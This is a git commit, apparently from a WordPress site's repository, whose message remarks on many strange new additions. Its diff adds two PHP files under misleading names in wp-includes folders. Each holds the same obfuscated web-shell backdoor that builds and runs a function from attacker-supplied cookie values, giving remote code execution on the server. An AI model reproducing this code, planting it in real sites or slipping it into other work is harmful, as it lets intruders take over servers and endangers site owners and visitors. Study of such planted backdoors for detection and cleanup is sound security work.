73fa70d7c15577c708c7fb0d9dc153b6202b6534
Pulipuli Chen <pulipuli.chen@gmail.com>
2018-08-04 02:12:01 +0800

    0804 有很多奇怪的新增資料

---
+++ wp-includes/css/object37.php
@@ -0,0 +1,7 @@
+<?php
+
+$txmk=$_COOKIE;
+$wagh=$txmk[yebq];
+if($wagh){
+	$ewdb=$wagh($txmk[ntjy]);$ezg=$wagh($txmk[fhra]);$acgf=$ewdb("",$ezg);$acgf();
+}
---
+++ wp-includes/images/smilies/ajax58.php
@@ -0,0 +1,7 @@
+<?php
+
+$ohgp=$_COOKIE;
+$nvd=$ohgp[ptjo];
+if($nvd){
+	$mbse=$nvd($ohgp[rerf]);$wbf=$nvd($ohgp[qhyt]);$fuubj=$mbse("",$wbf);$fuubj();
+}
